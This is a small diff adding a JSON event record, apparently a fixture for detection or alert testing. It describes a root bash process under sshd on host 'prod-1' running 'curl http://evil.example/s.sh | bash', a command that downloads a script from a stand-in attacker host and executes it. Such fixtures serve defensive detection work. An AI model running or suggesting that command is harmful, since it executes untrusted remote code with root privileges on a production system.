@@ -1,0 +1,5 @@
+{
+  "process": {"name": "bash", "command_line": "curl http://evil.example/s.sh | bash", "parent": {"name": "sshd"}},
+  "user": {"name": "root"},
+  "host": {"name": "prod-1"}
+}
